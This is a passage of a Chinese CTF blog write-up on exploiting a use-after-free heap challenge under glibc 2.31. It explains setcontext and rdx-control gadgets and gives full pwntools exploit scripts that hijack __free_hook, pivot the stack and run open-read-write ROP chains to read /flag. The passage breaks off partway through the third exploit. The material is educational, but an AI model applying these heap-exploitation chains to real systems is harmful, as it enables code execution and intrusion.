eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret</span><br></pre></td></tr></table></figure><h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>在<code>Glibc2.29</code>之后的<code>setcontext</code>中的<code>gadget</code>变成了以<code>rdx</code>为索引，因此如果按照之前的思路的话，还要先通过ROP控制RDX的值，如下所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="line">    ....</span><br><span class="line">.text:00000000000581C6                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00000000000581CD                 push    rcx</span><br><span class="line">.text:00000000000581CE                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00000000000581D2                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00000000000581D6                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00000000000581DD                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00000000000581E1                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00000000000581E5                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00000000000581EC                 xor     eax, eax</span><br><span class="line">.text:00000000000581EE                 retn</span><br></pre></td></tr></table></figure><p>但如果搜索过相应gadgets的同学应该有感受， 很难找到能够直接控制rdx寄存器的gadgets，这时候就需要常备一些 <code>万金油</code>gadgets，具体的gadgets在下文结合题目解法一同介绍</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目链接：<a href="https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw">https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw</a></p><p>提取码：y895</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>漏洞点就是UAF了，剩下的其实就是堆风水的问题了，具体的细节就不说了，讲讲主要思路</p><h3 id="解法一-Gadget-setcontext"><a href="#解法一-Gadget-setcontext" class="headerlink" title="解法一 Gadget+setcontext"></a>解法一 Gadget+setcontext</h3><p>这其中用到的<code>gadget</code>如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00154930      mov     rdx, qword [rdi + 8]</span><br><span class="line">0x00154934      mov     qword [rsp], rax</span><br><span class="line">0x00154938      call    qword [rdx + 0x20]</span><br></pre></td></tr></table></figure><p>这个<code>gadget</code>可以通过<code>rdi</code>来控制<code>rdx</code>，控制了<code>rdx</code>，我们就可以通过<code>setcontext</code>来控制其他寄存器，比如很重要的<code>rsp</code>等等</p><p>几个疑惑的点就是，一开始不知道为什么要<code>gadget</code>和<code>setcontext</code>这些指令，认为直接<code>orw</code>一把梭就行，其实这样是没法控制<code>rsp</code>，所以当你<code>ret</code>的时候就会有问题。</p><p>那么思路就是劫持<code>free_hook</code>为<code>gadget</code>，利用<code>call    qword [rdx + 0x20]</code>来跳转到<code>setcontext</code>来控制<code>rsp</code>等寄存器，之后再执行<code>orw</code>就行。</p><p>看一下关键部分的调试</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13607520853/0" alt="image-20210603114453858"></p><p>可以看到此时我们的<code>free_hook</code>已经劫持为我们的gadget，并且我们已经控制了<code>rdx</code>从而使<code>call</code>指令能够跳转到<code>setcontext</code>来执行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13607526697/0" alt="image-20210603114610939"></p><p>在<code>setcontext</code>执行完之后，就可以执行我们的<code>orw</code>了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;setcontext= &quot;</span>+<span class="built_in">hex</span>(setcontext)</span><br><span class="line">gadget = libc_base + <span class="number">0x154930</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00154930      mov     rdx, qword [rdi + 8]</span></span><br><span class="line"><span class="string">0x00154934      mov     qword [rsp], rax</span></span><br><span class="line"><span class="string">0x00154938      call    qword [rdx + 0x20]</span></span><br><span class="line"><span class="string">&lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]</span></span><br><span class="line"><span class="string">&lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]</span></span><br><span class="line"><span class="string">&lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]</span></span><br><span class="line"><span class="string">&lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]</span></span><br><span class="line"><span class="string">&lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]</span></span><br><span class="line"><span class="string">&lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]</span></span><br><span class="line"><span class="string">&lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]</span></span><br><span class="line"><span class="string">&lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2</span></span><br><span class="line"><span class="string">&lt;setcontext+107&gt;    je     setcontext+294 </span></span><br><span class="line"><span class="string">&lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span></span><br><span class="line"><span class="string">&lt;setcontext+301&gt;    push   rcx</span></span><br><span class="line"><span class="string">&lt;setcontext+294&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="string">&lt;setcontext+301&gt;:push   rcx</span></span><br><span class="line"><span class="string">&lt;setcontext+302&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="string">&lt;setcontext+306&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="string">&lt;setcontext+310&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line"><span class="string">&lt;setcontext+317&gt;:mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="string">&lt;setcontext+321&gt;:mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="string">&lt;setcontext+325&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="string">&lt;setcontext+332&gt;:xor    eax,eax</span></span><br><span class="line"><span class="string">&lt;setcontext+334&gt;:ret</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(heap_base+<span class="number">0x4b0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0xD50</span>)+<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,p64(gadget))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(setcontext)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(heap_base+<span class="number">0x820</span>)+p64(pop_rdi)</span><br><span class="line">edit_con(<span class="number">8</span>,payload)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x4d0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x500</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop_rdi)+p64(heap_base+<span class="number">0x500</span>)+p64(puts)</span><br><span class="line">edit_con(<span class="number">5</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>*<span class="number">3</span>+orw)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法二-Gadget-栈迁移"><a href="#解法二-Gadget-栈迁移" class="headerlink" title="解法二 Gadget+栈迁移"></a>解法二 Gadget+栈迁移</h3><p>因为要进行栈迁移，所以上一种解法的<code>gadget</code>肯定是没法用的，栈迁移肯定是需要控制<code>rbp</code>的，那么用到的<code>gadget</code>如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00157d8a      mov     rbp, qword [rdi + 0x48]</span><br><span class="line">0x00157d8e      mov     rax, qword [rbp + 0x18]</span><br><span class="line">0x00157d92      lea     r13, [rbp + 0x10]</span><br><span class="line">0x00157d96      mov     dword [rbp + 0x10], 0</span><br><span class="line">0x00157d9d      mov     rdi, r13</span><br><span class="line">0x00157da0      call    qword [rax + 0x28]</span><br></pre></td></tr></table></figure><p>剩下其实也是堆风水的事了，但是这里有一个注意的点是，最后执行orw的时候会发现跟前面的<code>payload</code>的地方会有重复，所以这里有了点小trick，就是下面这个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00026b69      pop     rbx</span><br><span class="line">0x00026b6a      pop     rbp</span><br><span class="line">0x00026b6b      pop     r12</span><br><span class="line">0x00026b6d      pop     r13</span><br><span class="line">0x00026b6f      pop     r14</span><br><span class="line">0x00026b71      pop     r15</span><br><span class="line">0x00026b73      ret</span><br></pre></td></tr></table></figure><p>利用这个把栈往高地址抬之后，就能跳过那段有冲突的地方，之后再写入orw就行了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x157d8a</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line">pop6 = libc_base + <span class="number">0x00026b69</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00157d8a      mov     rbp, qword [rdi + 0x48]</span></span><br><span class="line"><span class="string">0x00157d8e      mov     rax, qword [rbp + 0x18]</span></span><br><span class="line"><span class="string">0x00157d92      lea     r13, [rbp + 0x10]</span></span><br><span class="line"><span class="string">0x00157d96      mov     dword [rbp + 0x10], 0</span></span><br><span class="line"><span class="string">0x00157d9d      mov     rdi, r13</span></span><br><span class="line"><span class="string">0x00157da0      call    qword [rax + 0x28]</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,p64(gadget))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_base+<span class="number">0x5e0</span>)+<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x510</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x750</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop6)</span><br><span class="line">edit_con(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(pop6)+p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x600</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(pop6)+p64(leave_ret)+p64(<span class="number">0</span>)*<span class="number">5</span>+orw)</span><br><span class="line">payload = p64(pop_rdi)+p64(heap_base+<span class="number">0x750</span>)+p64(puts)</span><br><span class="line">edit_con(<span class="number">4</span>,p64(<span class="number">0</span>)+payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#chunk_ptr = 0x5555555580a0</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法三-利用environ来泄露栈地址覆盖返回地址"><a href="#解法三-利用environ来泄露栈地址覆盖返回地址" class="headerlink" title="解法三 利用environ来泄露栈地址覆盖返回地址"></a>解法三 利用environ来泄露栈地址覆盖返回地址</h3><p>这种思路就非常的简单，我们泄露了<code>environ</code>变量保存的栈地址后经过调试就可以知道<code>main</code>函数的返回地址于我们泄露的地址之间的偏移之后将堆块申请过去即可覆盖返回地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610298945/0" alt="image-20210603211324175"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610299476/0" alt="image-20210603211333929"></p><p>可以看到此时我们已经输出了Bye，我们的<code>main</code>函数即将返回，此时我们可以算出相差<code>0x100</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610302718/0" alt="image-20210603211437417"></p><p>将返回地址覆盖为orw即可</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610305048/0" alt="image-20210603211522052"></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span 